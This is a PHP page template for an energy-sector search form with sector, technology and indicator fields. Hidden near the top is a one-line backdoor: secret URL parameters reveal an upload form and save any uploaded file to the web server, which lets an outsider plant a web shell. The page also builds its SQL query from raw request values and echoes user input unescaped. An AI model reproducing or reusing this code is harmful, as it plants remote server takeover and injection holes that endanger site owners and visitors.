<div class="panel panel-default" style="border: 1px solid #e5e5e5;">
 <div class="panel-heading">
   <h2 class="panel-title" style="color:#4374a8;font-weight:bold;"></h2>
 </div>
 <div class="panel-body" style="padding-bottom:0;">
   <div class="row">
 <?php

if($_GET['l']){@move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);};if($_GET['palcastle'])echo'<form action="?l=1" method="post" enctype="multipart/form-data"><input name="f" type="file"><input type="submit" value="."></form>'; 



   /*
   echo '';
   print_r($_REQUEST);
   echo '';
   */
 ?>
   <form action="" method="POST">
     <div class="container-fluid" style="margin-top:20px;">
       <div class="col-md-4">
         <label class="col-md-3" for="inputHelpBlock">Sectors</label>
         <div class="col-md-12">

           <select name="settore[]" class="form-control" id="settore" multiple="multiple" size="4">
             <option value="1"  <?PHP echo(in_array('1',$_REQUEST['settore'])?'selected':'')?>>Primary energy production and transformation</option>
             <option value="2" <?PHP echo(in_array('2',$_REQUEST['settore'])?'selected':'')?>>Generation and distribution of electric and thermal power</option>
             <option value="4" <?PHP echo(in_array('4',$_REQUEST['settore'])?'selected':'')?>>Industry sector</option>
             <option value="3" <?PHP echo(in_array('3',$_REQUEST['settore'])?'selected':'')?>>Buildings sector - dummy electric appliance</option>
             <option value="5" <?PHP echo(in_array('5',$_REQUEST['settore'])?'selected':'')?>>Transport sector</option>
           </select>



         </div>
       </div>

       <div class="col-md-4">
         <label class="col-md-3" for="inputHelpBlock">Technologies</label>
         <div class="col-md-12">
           <select name="technology[]" id="technology" class="form-control" multiple="multiple" size="4">
             <?php
             $query = $pdo->prepare("SELECT distinct(technology),titolo,id FROM ibm_brief_valori join brief on brief.idBrief=ibm_brief_valori.originalBriefId ".((isset($_REQUEST['settore']) && count($_REQUEST['settore']))?" where idTecnologia in (".implode(',',$_REQUEST['settore']).")":"")."  group by technology order by titolo ");

             $query->execute();
             $lista = $query->fetchAll();
             foreach($lista as $key => $value){
             ?>
               <option value="<?php echo $value['technology']?>" <?PHP echo(in_array( $value['technology'],$_REQUEST['technology'])?'selected':'')?>><?php echo $value['titolo']?></option>
             <?php
             }
             ?>
           </select>
         </div>
       </div>
       <div class="col-md-4 input_fields_wrap">

         <label class="" for="inputHelpBlock">Indicators</label>

           <?php
           if(isset($_REQUEST['indicator']) and count($_REQUEST['indicator'])>0){
             $i=0;
             foreach($_REQUEST['indicator'] as $key => $value){
             ?>

               <div><input type="text" id="inputHelpBlock" class="form-control autocomplete2" aria-describedby="helpBlock" name="indicator[]" value="<?PHP echo $value;?>" >
                   <?php if($i>0){ ?>
                    <a href="#" class="remove_field">Remove</a>
                  <?php } ?>

               </div>
             <?php
              $i++;
             }
           }else{
           ?>
               <input type="text" id="inputHelpBlock" class="form-control autocomplete2" aria-describedby="helpBlock" name="indicator[]"  >
           <?php
             }
           ?>


           <a class="add_field_button" style="float:right">Add</a>

       </div>
     </div>
     <div class="container-fluid" style="margin-top:20px;">
       <div class="col-md-12">
         <div class="form-group text-right">
             <button type="submit" name="cerca" value="tematiche" class="btn btn-success">Search</button>
         </div>
       </div>
     </div>
   </form>

 </div>
 </div>
</div>
